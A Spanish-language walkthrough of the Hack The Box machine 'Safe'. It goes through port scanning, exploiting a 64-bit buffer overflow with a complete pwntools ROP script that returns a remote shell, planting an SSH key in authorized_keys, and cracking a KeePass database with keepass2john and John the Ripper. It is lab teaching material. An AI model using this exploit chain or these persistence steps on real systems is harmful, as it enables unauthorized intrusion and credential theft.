---
title: Safe - Hack The Box
categories: [Linux, WASTE, Buffer Overflow, Python, Segmentation Fault, GDB, GEF, x64, 64 bits, DEP, Data Execution Prevention, NX, No-Execute, ROP, Return Oriented Programming, Reverse Engineering, Ghidra, pwntools, gadgets, pop, KeePass, SSH, SCP, Secure Copy Protocol, Busybox, John the Ripper, keepass2john]
published: true
lang: es
---

El día de hoy vamos a estar resolviendo la máquina _Safe_ de _Hack The Box_. Es una máquina _Linux_ de nivel de dificultad media en la intrusión, y media en la escalada de privilegios según figura en la plataforma. 

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/1.png){:class="blog-image" onclick="expandImage(this)"} 

### [](#header-3)Fase De Reconocimiento

Primeramente vamos a lanzar una _traza ICMP_ para saber si la máquina está activa.

```
ping -c 1 10.10.10.147
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/2.png){:class="blog-image" onclick="expandImage(this)"} 

Una vez comprobamos que la máquina está activa (pues nos devuelve una respuesta), podemos también determinar a que tipo de máquina nos estamos enfrentando en base al valor del _TTL_; en este caso el valor del _TTL_ de la máquina es `63`, por lo que podemos intuir que estamos ante una máquina _Linux_. Recordemos que algunos de los valores referenciales son los siguientes:

| Sistema Operativo (OS) | TTL |
|:-----------------------|:----|
| Linux                  | 64  |
| Windows                | 128 |
| Solaris                | 254 | 

Si nos damos cuenta, en esta ocasión, el valor del _TTL_ es `63` y no `64` como indica la tabla anterior, esto se debe a que en el entorno de máquinas de _Hack The Box_, no nos comunicamos directamente con la máquina a vulnerar, sino que existe un intermediario, por lo que el _TTL_ disminuye en una unidad.

```
ping -c 1 10.10.10.147 -R                               
``` 

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/3.png){:class="blog-image" onclick="expandImage(this)"} 

Posteriormente, vamos a utilizar la herramienta _Nmap_ para determinar que puertos están abiertos, así como identificar la versión y servicios que corren en el activo. Para determinar que puertos están abiertos podemos realizar lo siguiente:

```bash
nmap -p- --open -T5 -v -n 10.10.10.147
```

En caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa:

```bash 
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.147
```

A continuación se explican los parámetros utilizados en el escaneo de puertos con _Nmap_:

| Parámetro | Explicación |
|:----------|:------------|
| \-p\- | Escanea todo el rango de puertos (65535 en total) |
| \-\-open | Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos) |
| \-T5 | La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, "generaremos más ruido", pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos `White Hat` | 
| \-v | _Verbose_, reporta lo encontrado por consola |
| \-n | No aplicar _resolución DNS_ |
| \-sS | Escaneo _TCP SYN_ |
| \-min-rate | Emitir paquetes no más lentos que \<valor\> por segundo |
| \-vvv | Triple _verbose_, para obtener mayor información por consola |
| \-Pn | No aplicar _host discovery_ |

```bash
nmap -sC -sV -p 22,80,1337 10.10.10.147
```

A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con _Nmap_:

| Parámetro | Explicación |
|:----------|:------------|
| \-sC | Scripts básicos de enumeración |
| \-sV | Versión y servicios que corren bajo los puertos encontrados |
| \-p | Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior) |

Basándonos en la información que nos reporta _Nmap_, podemos darnos cuenta que la máquina víctima tiene abierto un puerto relacionado con `HTTP`; asimismo, encontramos abierto el puerto `1337`, relacionado con el protocolo `WASTE`, el cual permite el intercambio de archivos de forma cifrada.

Debido a que la máquina cuenta con el puerto `80` abierto, podríamos intentar aplicar `fuzzing`, no obstante, no vamos a encontrar nada interesante. 

Lo siguiente que podemos hacer es determinar ante que nos estamos enfrentando, para ello podemos hacer uso de `WhatWeb`, herramienta que se encarga de identificar que tecnologías web se están empleando, véase gestores de contenido (CMS), librerias o plugins, o finalmente el sistema operativo que se está utilizando para alojar el servidor web.

```
whatweb http://10.10.10.147
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/4.png){:class="blog-image" onclick="expandImage(this)"} 

Como podemos observar, no hay nada especialmente relevante a excepción del título de la página, el cual es el mensaje por defecto que aparece cuando montamos una página web haciendo uso del servidor `Apache`, por lo que podemos irnos haciendo a la idea, de que la entrada a la máquina, no será vía web.

En vista de que ya no nos es posible trabajar desde la terminal, tendremos que visitar estas páginas desde nuestro navegador.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/5.png){:class="blog-image" onclick="expandImage(this)"} 

En efecto, lo primero que vemos al abrir la página web, es la página por defecto que viene cuando montamos una página web mediante el servidor `Apache`, por lo que, podemos inspeccionar el código fuente, en busca de alguna pista; para verlo de manera más cómoda podemos hacer `Ctrl + U`.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/6.png){:class="blog-image" onclick="expandImage(this)"} 

Si nos percatamos, en las primeras líneas del código fuente, hay un comentario que nos menciona que `myapp`, alojado en el puerto `1337`, lo podemos descargar; para ello, podemos intentar añadir `/myapp`, al final del url.

_Los comentarios en HTML, siempre tienen la siguiente estructura:_

```
<!-- Este es un comentario a modo de prueba -->
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/7.png){:class="blog-image" onclick="expandImage(this)"} 

Al añadir `/myapp`, al final del url, se nos va a descargar un archivo que lleva por nombre, `myapp`, el cual vamos a empezar a analizar. 

### [](#header-3)Fase De Explotación

Lo primero que debemos hacer, es saber que es `myapp`, para ello podemos usar el comando `file`.

```
file myapp
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/8.png){:class="blog-image" onclick="expandImage(this)"} 

Nos damos cuenta de que el archivo `myapp`, es un binario, por lo que procederemos a darle permisos de ejecución para saber qué hace:

```
chmod 744 myapp
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/9.png){:class="blog-image" onclick="expandImage(this)"} 

Al ejecutar el binario `myapp`, nos reporta por consola la hora actual, además de imprimir el mismo mensaje que introduzcamos; esto no nos es de ayuda, por lo que podríamos intentar extraer las cadenas de caracteres que se encuentran dentro del binario con el comando `strings`, sin embargo, no hay nada interesante.

Lo siguiente que podríamos intentar, sería realizar un `Buffer Overflow`, para ello, cuándo el binario `myapp`, nos pregunte por una cadena de caracteres, debemos ingresar una que sea bastante larga.

Una manera rápida con la cual podemos conseguir cadenas de caracteres cuan largas queramos, sería haciendo uso de `Python`.

```bash
python -c 'print "A"*365'
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/10.png){:class="blog-image" onclick="expandImage(this)"} 

Si nos percatamos, al introducir nuestra cadena de _365 letras A_, el binario `myapp`, deja de funcionar como debería, esto se debe a un `Segmentation Fault` (_Fallo de Segmentación_), los cuales se dan cuando empezamos a sobrescribir registros. Ahora, ¿por qué se están sobrescribiendo algunos registros? 

Cuando el programa `myapp`, nos pregunta por una cadena de caracteres, este almacena nuestra respuesta en un bloque de memoria, el `buffer`, el cual puede almacenar una cierta cantidad de bytes, la cual de momento desconocemos; si introducimos una cantidad de bytes mayor a la que el buffer estaba diseñado, el programa corrompe.

La pregunta ahora es, ¿a dónde se dirigen estos bytes que están desbordando el `buffer`, acaso desaparecen? La respuesta es no, como mencioné, empezamos a sobrescribir registros, de modo que los bytes siguientes a la cantidad máxima de bytes que soporta el buffer, se dirigen al siguiente valor de memoria, y así sucesivamente.

El concepto de `Buffer Overflow` puede parecer complejo en un inicio, pero es mucho más fácil de asimilarlo cuando lo visualizamos; para ello, haremos uso de `GDB`, herramienta que nos permitirá depurar el binario `myapp`. Concretamente estaré haciendo uso de `GEF` (_GDB Enhanced Features_), el cual es una extensión para GDB, así como lo es `PEDA` (_Python Exploit Development Assistance_).

Si queremos instalar `GEF`, podemos seguir las instrucciones dadas por la [página oficial](https://gef.readthedocs.io/en/master/#setup), no obstante, en mi caso, esto no me funcionó, por lo que tuve que realizar lo siguiente:

```
pip3 install capstone unicorn keystone-engine ropper

wget https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/gefInstall.sh
chmod 744 gefInstall.sh
./gefInstall.sh
rm gefInstall.sh
```

Ya con `GEF` instalado podemos empezar a depurar el binario `myapp`.

```
gdb myapp

run
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/11.png){:class="blog-image" onclick="expandImage(this)"} 

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/12.png){:class="blog-image" onclick="expandImage(this)"} 

Algo importante a mencionar, antes de empezar el análisis con `GEF`, es que la arquitectura del sistema ante el que nos estamos enfrentando a la hora de explotar `Buffer Overflow`, tiene bastante relevancia; en este caso concreto, nos estamos enfrentando ante una máquina de `64 bits`, y esto lo podemos saber ya que el nombre de los registros empieza por 'R' (_RBP, RSP, RIP_), en caso de que el sistema fuera de `32 bits`, el nombre de los registros empezaría por 'E' (_EBP, ESP, EIP_), no obstante, independientemente de la arquitectura, estos registros se refieren a lo mismo.

Para explotar un `Buffer Overflow` satisfactoriamente, existen dos requisitos indispensables, el primero es sobrescribir el registro _RIP_ o _EIP_ (según corresponda), ya que este, apunta a la dirección siguiente a ejecutar, por lo que nos interesa como atacantes redirigir el flujo del programa a nuestro antojo, cabe aclarar que la dirección introducida debe de existir dentro del programa, caso contrario, este corromperá como lo está haciendo ahora mismo; el segundo requisito se refiere a, de qué manera vamos a sobrescribir el registro `RIP`, para ello debemos calcular su _offset_.

Sobre el mensaje _Cannot disassemble from $PC_, veremos una pequeña flecha que nos indica en que sección, el programa dejó de funcionar, en este caso es en una función de retorno que apunta hacia el registro `RSP`, el cual, si nos percatamos, está lleno de _letras A_; nuestro objetivo ahora es, determinar después de cuántos bytes, empezaremos a sobrescribir el registro `RSP`.

Haciendo uso de `GEF`, esto es bastante sencillo, ya que lo hará por nosotros, por lo que debemos realizar lo siguiente:

```
gdb myapp

pattern create
run
pattern offset $rsp
```
![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/13.png){:class="blog-image" onclick="expandImage(this)"} 

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/14.png){:class="blog-image" onclick="expandImage(this)"} 

Sabemos ahora que, después de ingresar _120 bytes_, empezaremos a sobrescribir el registro `RSP`, y esto lo podemos comprobar de manera sencilla, intentando ingresar en este registro, _8 letras B_, por ejemplo.

```bash
python -c 'print "A"*120 + "B"*8'
```

```
gdb myapp

run
```
![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/15.png){:class="blog-image" onclick="expandImage(this)"} 

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/16.png){:class="blog-image" onclick="expandImage(this)"} 

En efecto, al ingresar _120 bytes_, empezamos a sobrescribir el `RSP`, ya con esto en mente, debemos verificar que estándares de seguridad se están aplicando sobre el binario, para así determinar que metodología emplearemos para explotarlo; para conocer que seguridades se están aplicando, haremos uso de `checksec`, esto podemos hacerlo tanto dentro de `GEF`, como fuera de él.

```
gdb myapp

checksec
```
![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/17.png){:class="blog-image" onclick="expandImage(this)"} 

```
checksec myapp
```
![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/18.png){:class="blog-image" onclick="expandImage(this)"} 

Podemos observar que el `DEP` (_Data Execution Prevention_), o `NX` (_No-Execute_), está activado; esta protección nos impedirá ejecutar código a través del _stack_, por lo que no tendrá sentido redirigir el flujo del programa por ahí, por lo que debemos ver, de qué manera, haciendo uso de las mismas posibilidades que nos ofrece el binario `myapp`, podemos explotarlo, a este concepto se lo conoce como `ROP` (_Return Oriented Programming_).

Ya en este punto, sabido lo que tenemos que hacer, podemos empezar a aplicar _ingeniería inversa_ sobre el binario, para hacerlo, haremos uso de `Ghidra`, una suite de herramientas dedicada a la _ingeniería inversa_, desarrollada por la _NSA_. 

Para descargar `Ghidra`, ingresaremos [aquí](https://github.com/NationalSecurityAgency/ghidra/releases), y descargaremos la versión más reciente.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/19.png){:class="blog-image" onclick="expandImage(this)"} 

```
unzip <archivoQueHayamosDescargado>
cd <carpetaQueSeHayaCreado>
./ghidraRun
```

Presionaremos _File_, _New Project_, _Non-Shared Project_, elegiremos un espacio de trabajo, le damos un nombre a nuestro proyecto, presionamos _File_, _Import File_, seleccionamos el binario `myapp`, arrastramos el binario que acabamos de importar hacia el dragón, y finalmente aceptamos analizar. 

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/20.png){:class="blog-image" onclick="expandImage(this)"} 

Ya en este punto podemos empezar a analizar que hay dentro del binario `myapp`, por ejemplo, podemos analizar que funciones están definidas, para ello, desplegaremos el menú _Functions_, que se encuentra al lado izquierdo, podemos empezar por analizar la función `main`.
![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/21.png){:class="blog-image" onclick="expandImage(this)"} 

Si nos percatamos, esto es lo que encontramos cuando ejecutamos `myapp`; nos damos cuenta de que se está definiendo una variable de nombre `local_78` que acepta una cierta cantidad de bytes, concretamente, 112, la cual almacena la cadena de caracteres que nos pide ingresar, para posteriormente, volver a mostrarla por pantalla, adicionalmente, se está ejecutando una llamada al sistema para ejecutar el comando `uptime`.

Podemos observar dos cosas interesantes, por un lado, se está haciendo uso de la función `gets()`, una función considerada insegura, debido principalmente a que esta, no verifica la longitud del buffer, razón por la cual, podemos desbordarlo. Por otra parte, nos damos cuenta de que se está haciendo una llamada al sistema, algo que llama nuestra atención, ya que si lográramos introducir un comando diferente a `uptime`, podríamos conseguir una consola dentro de la máquina víctima.

Pero, ¿cómo introducimos un comando si el programa ya está compilado? La respuesta está en la función `test`, y el concepto de `ROP`.

No obstante, vamos a analizar el binario `myapp`, una vez más, con la diferencia de que vamos a empezar a automatizar lo que vamos a hacer, pues ya tenemos una idea clara de por donde van los tiros. Para ello, podemos crear un script en `Python`, para lo cual empezaremos por colocar la cabecera de `Python 3`, importar la librería `pwntools`, y definir tanto la _arquitectura_ como el _sistema operativo_ de la máquina víctima, adicionalmente, podemos definir que tipo de terminal queremos emplear para poder trabajar más a gusto.

```python
#!/usr/bin/python3

from pwn import *

context.terminal = ['gnome-terminal', '-x']
context.arch = 'amd64'
context.os = 'linux'
```

En caso de no contar con la librería `pwntools`, podemos hacer lo siguiente:

```
apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade pwntools
```

Una vez definida la base del script, podemos empezar a trabajar. Nos interesa saber en que registro, se está almacenando el comando `uptime`, para lo cual, empezaremos por definir un proceso, el cual será la depuración del binario, añadiremos un _breakpoint_ en la dirección donde se hace la llamada al sistema, y, adicional a ello, indicaremos al script que nos espere hasta escribir algo después de _What do you want me to echo back?_, caso contrario, el script se cerrará.

```python
p = gdb.debug('/ubicación/del/binario/myapp', 'b *0x40116e')
p.recvuntil("What do you want me to echo back?")
```

La dirección de la llamada al sistema, la podemos sacar de `Ghidra`:

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/22.png){:class="blog-image" onclick="expandImage(this)"} 

Ejecutamos nuestro script, no sin antes haberle asignado los permisos correspondientes:

```
chmod 744 <nuestroScript.py>
```

En este punto podemos presionar la tecla `c`, para continuar, y nos daremos cuenta que el comando `uptime`, está siendo almacenado en el registro `RDI`.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/23.png){:class="blog-image" onclick="expandImage(this)"} 

En este punto, tenemos que buscar una forma de sobrescribir el registro `RDI`, y la clave está en la función `test`

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/24.png){:class="blog-image" onclick="expandImage(this)"} 

Si nos percatamos, en la dirección `0x401156`, el contenido que se encuentra en el registro `RSP`, está siendo almacenado en el registro `RDI`; ¿cuándo almacenábamos las _8 letras B_, en qué registro las estábamos almacenando? Exacto, en `RSP`, por lo que ahora, debemos de buscar una forma en la que poder redirigir el flujo del programa a través de la función `test`, para que cuando esta termine, podamos ejecutar el comando que deseemos.

Sin embargo, hay un pequeño problema, en la siguiente instrucción, `0x401159`, se está efectuando un _jump_ a `R13`, el cual apunta a una dirección que no nos interesa, por lo que también debemos de hallar una forma en la que inyectar la dirección en la que se efectúa la llamada al sistema, de modo que así, a la llamada al sistema, le estamos pasando como argumento nuestro código malicioso definido en `RDI`.

La pregunta ahora es, ¿de qué manera inyectamos la dirección de la llamada al sistema, en `R13`? Esto lo haremos haciendo uso de `gadgets`, los cuales no son más que instrucciones de la CPU, ya definidas dentro del programa. 

Haciendo uso de nuestro script, escribiremos ahora `ropper`, lo cual nos permitirá listar todos los `gadgets` dentro del binario.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/25.png){:class="blog-image" onclick="expandImage(this)"} 

Vemos que se nos lista un total de _99 gadgets_, de los cuales nos interesa `pop`, ya que este nos permite cargar un valor en el registro al que esté asignado, por lo que procederemos a listar que opciones tenemos con el `gadget pop`.

```
ropper --search "pop"
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/26.png){:class="blog-image" onclick="expandImage(this)"} 

Observamos, que tenemos una opción que nos permite hacer un `pop` a `R13`, aunque esta va seguida de `pops` a otras direcciones, por lo que a estas, tendremos que asignarles valores nulos, ya que no nos interesan. 

Ya con toda esta información, es posible finalmente, explotar el binario `myapp`, haciendo uso de `Buffer Overflow`, `Return Oriented Programming` y `gadgets`, por lo que regresaremos a nuestro script en `Python`.

Lo primero que vamos a hacer, es comentar o borrar la línea en la que aplicábamos un _breakpoint_ a la llamada al sistema, ya que no la vamos a usar más, esto mismo haremos con la línea del p.recvuntil(). Por otra parte, vamos a empezar por definir variables; la primera será `popR13`, la cual va a valer la dirección en la que se aplica este `gadget`; la segunda será `system`, la cual va a valer la dirección de la llamada al sistema; la tercera será `test`, la cual va a valer la dirección de la función `test`.

La dirección de la función `test`, la podemos sacar de `Ghidra`:

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/27.png){:class="blog-image" onclick="expandImage(this)"} 

```python
popR13 = p64(0x401206)
system = p64(0x40116e)
test = p64(0x401152)
```

Es importante tener en cuenta que, en todo momento, estamos trabajando en `64 bits`.

Por otra parte, vamos a empezar por definir el número de _letras A_ que queremos introducir, previo a desbordar el `buffer`, esto lo vamos a almacenar en una variable de nombre `junk`, eso si, deberemos de codificar la variable en formato bytes.

```python
junk = ("A"*112).encode()
```

Si nos percatamos, estamos introduciendo _112 letras A_, y no _120_, porque ciertamente el `buffer` se desborda con _112 bytes_, como pudimos ver con `Ghidra`, no obstante, para poder empezar a sobrescribir registros tenemos que introducir _120 bytes_ como vimos con `GEF`, pues estamos frente a un _sistema operativo_ de `64 bits`, por lo que necesitamos de `8 bytes` para insertar un valor en el `stack`, en caso de estar en un sistema operativo de `32 bits`, necesitaríamos de `4 bytes`. 

Entonces, la variable `local_78` ciertamente tiene una longitud máxima de _112 bytes_, sin embargo, necesitamos de _8 bytes_ más, para desbordar satisfactoriamente el `buffer`, de este modo, los bytes siguientes a 112 se estarían almacenando en el registro `RSP`, pero hasta que no introduzcamos como mínimo _120 bytes_, no vamos a conseguir un `Segmentation Fault`, razón por la cual, si al binario `myapp`, le pasamos una cadena ya sea de 113, 114, 115, 116 117, 118 o 119 bytes, conseguiremos una salida exitosa.

Lo que nos interesa ahora, es sobrescribir el registro `RSP` con nuestro código malicioso, de modo que este pase al registro `RSI`, de modo que cuando se ejecute la función `jump` hacia la dirección de la llamada al sistema, nos ejecute nuestro código.

Concretamente vamos a ejecutar el comando `/bin/sh` en adición de un `null byte` por si nos da problemas, la longitud total de esta cadena es de _8 bytes_, (7 en `/bin/sh`, más el del `null byte`) por lo que estaríamos desbordando el `buffer`, e ingresando esta cadena en el registro `RSP`.

La siguiente variable por definir será `binSh`, la cual, como mencionamos, valdrá el comando `/bin/sh` en adición de un `null byte`, y al igual que la variable `junk`, deberemos codificarla; la última variable que definiremos será, `nullByte`, la cual usaremos para asignar valores nulos a las direcciones `R14` y `R15`.

```python
binSH = "/bin/sh\x00".encode()
nullByte = p64(0x0)
```

Ya para finalizar, debemos indicar la cadena de caracteres que queremos enviar, después de que se nos pregunte _What do you want me to echo back?_, para hacer esto tendremos que hacer uso de `p.sendline()`, dentro del cual indicaremos las variables que acabamos de definir, en su respectivo orden.

```python
p.sendline(junk + binSH + popR13 + system + null + null + test)
```

En primer lugar estamos introduciendo una cadena de _112 bytes_, posteriormente introducimos nuestro código malicioso que suma una longitud de _8 bytes_, de modo que estaríamos ya, sobrescribiendo el registro `RSP`, que se convertirá en `RSI`, posteriormente, haremos una llamada al `gadget pop`, al cual le pasaremos como argumentos lo que nos solicita, la dirección de `R13`, `R14`, `R15` y `RET`, los cuales valdrán la dirección de la llamada al sistema, valor nulo, valor nulo y como función de regreso, la dirección de la función `test`, redirigiendo así, el flujo del programa a través de esa función.

Ya lo que nos quedaría, sería ejecutar nuestro script, no de manera local, pero remota, para lo cual debemos introducir la dirección IP de la máquina víctima, e indicar el puerto a través del cual nos queremos conectar.

```python
p = remote("10.10.10.147", 1337)
```

Así mismo, es necesario especificar que queremos interactuar con la consola que estamos consiguiendo, para lo cual deberemos indicar lo siguiente:

```python
p.interactive()
```

Nuestro script, debería verse algo así:

```python
#!/usr/bin/python3

from pwn import *

context.terminal = ['gnome-terminal', '-x']
context.arch = 'amd64'
context.os = 'linux'

# p = gdb.debug('/ubicación/del/binario/myapp', 'b *0x40116e')
# p.recvuntil("What do you want me to echo back?")

p = remote("10.10.10.147", 1337)

popR13 = p64(0x401206)
system = p64(0x40116e)
test = p64(0x401152)
 
junk = ("A"*112).encode()
  
binSh = "/bin/sh\x00".encode()
  
nullByte = p64(0x0)
  
p.sendline(junk + binSh + popR13 + system + nullByte + nullByte + test)
  
p.interactive()
```

Al ejecutar nuestro script, lo que vamos a conseguir es una consola, por lo que una vez dentro del sistema, podríamos listar la flag del usuario con bajos privilegios.

```
find / -name user.txt 2> /dev/null
```
![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/28.png){:class="blog-image" onclick="expandImage(this)"} 

### [](#header-3)Escalada De Privilegios

Para conseguir la flag del usuario con máximos privilegios, podemos emepezar por listar el contenido dentro de la carpeta del usuario user.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/29.png){:class="blog-image" onclick="expandImage(this)"} 

Nos vamos a encontrar con una serie de imágenes, en adición de un archivo de extensión `.kdbx`, el cual guarda relación con el gestor de contraseñas KeePass. Debido a que nos encontramos en una máquina remota, no podremos visualizar las imágenes alojadas dentro de la máquina víctima, por lo que tenemos que buscar una forma de transferirlas a nuestro equipo.

Si recordamos, el puerto 22 estaba abierto, por lo que podríamos conectarnos por `SSH` a la máquina remota, no obstante, ¿cómo nos vamos a conectar sin proporcionar credenciales? Esto lo haremos introduciendo nuestra clave pública, dentro de un archivo de nombre `authorized_keys` ubicado en la carpeta `.ssh`, dentro del directorio del usuario user.

Lo primero que haremos será crear un par de claves `SSH`, una pública, y una privda, esto lo haremos haciendo uso de `ssh-key`.

```
cd ~/.ssh/
ssh-keygen
```
![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/30.png){:class="blog-image" onclick="expandImage(this)"} 

En caso de querer ingresar algún tipo de contraseña, se lo puede hacer. Ya teniendo el par de claves `SSH`, vamos a copiar el contenido de nuestra clave pública, para posteiormente añadirla en la ruta `/home/user/.ssh/authorized_keys`.


```
echo "nuestraClavePública" >> /home/user/.ssh/authorized_keys
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/31.png){:class="blog-image" onclick="expandImage(this)"} 

Una vez hecho esto, podemos conectarnos a través de `SSH` a la máquina víctima.

```
ssh user@10.10.10.147
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/32.png){:class="blog-image" onclick="expandImage(this)"} 

En vista de que estamos conectados a la máquina vía `SSH`, podríamos intentar transferir los archivos del directorio `/home/user/`, haciendo uso de `SCP` (_Secure Copy Protocol_), aunque también pudimos haberlo hecho creando un servidor en la máquina remota mediante `Busybox`, y posteriormente, descargando las imágnes a través de `Wget`.

```
scp "user@10.10.10.147:/home/user/*" .
```
![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/33.png){:class="blog-image" onclick="expandImage(this)"} 

Una vez tengamos tanto las imágenes como el archivo `MyPasswords.kdbx` en nuestro equipo, podemos empezar a analizar que hacer con ello; dudo mucho que las imágenes tengan algo que ver con `esteganografía`, ya que si abrimos el archivo `MyPasswords.kdbx` con `keepassxc`, nos pregunta por un archivo clave.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/34.png){:class="blog-image" onclick="expandImage(this)"} 

En caso de no contar con `keepassxc` instalado, podemos hacer lo siguiente:

```
sudo apt install keepassxc
```

Ya en este punto, lo que se nos podría ocurrir sería intentar aplicar fuerza bruta sobre el archivo `MyPasswords.kdbx`, no obstante, primero tendremos que pasar de formato `KeePass`, a formato `john`, para crackear la contraseña haciendo uso de `John the Ripper`, de modo que usaremos  `keepass2john`.

Antes de hacerlo hay que recordar que las imágenes están por algo, para lo cual se las pasaremos como argumento a `keepass2john`, mediante el parámetro `-k`. Esto se vería algo así:

```bash
keepass2john -k <imagenDeseada> MyPasswords.kdbx
```

Esto va a hacer el trabajo, pero podemos reducir tiempo automatizándolo, para ello haremos uso de un _bucle for_, para ir iterando sobre cada imagen.

```bash
for image in $(echo "IMG_0545.JPG  IMG_0546.JPG  IMG_0547.JPG  IMG_0548.JPG  IMG_0552.JPG  IMG_0553.JPG"); do keepass2john -k $image MyPasswords.kdbx; done
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/35.png){:class="blog-image" onclick="expandImage(this)"} 

Utilizar el comando anterior nos sirve, sin embargo, si lo pensamos un poco, si redirigimos este ouput a un fichero hashes.txt, por ejemplo, al cual luego le aplicaremos `john`, cuando este encuentre la contraseña, nos dirá que la imágen que utilizó fue _MyPasswords_, lo cual no nos es de ayuda, por lo que podemos reemplazar _MyPasswords_, por el nombre de la imagen.

```bash
for image in $(echo "IMG_0545.JPG  IMG_0546.JPG  IMG_0547.JPG  IMG_0548.JPG  IMG_0552.JPG  IMG_0553.JPG"); do keepass2john -k $image MyPasswords.kdbx | sed "s/MyPasswords/$image/"; done >> nombreArchivo
```
![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/36.png){:class="blog-image" onclick="expandImage(this)"} 

Finalmente, para crackear la contraseña, haremos uso de `john` en conjunto del diccionario [rockyou.txt](https://objects.githubusercontent.com/github-production-release-asset-2e65be/97553311/d4f580f8-6b49-11e7-8f70-7f460f85ab3a?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20220209%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20220209T031834Z&X-Amz-Expires=300&X-Amz-Signature=d8b079596701be0a466831ad31ee5cc654d2cc6b43291d532f275e51b6e480fb&X-Amz-SignedHeaders=host&actor_id=79855501&key_id=0&repo_id=97553311&response-content-disposition=attachment%3B%20filename%3Drockyou.txt&response-content-type=application%2Foctet-stream).

En caso de no contar con la herramienta John the Ripper instalada, podemos hacer lo siguiente:

```
sudo apt install john
```

```
sudo john --wordlist=/ruta/del/diccionario/rockyou.txt nombreArchivo
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/37.png){:class="blog-image" onclick="expandImage(this)"} 

Una vez conseguimos tanto la contraseña como el archivo clave, ya podremos abrir el archivo `MyPasswords.kdbx`.

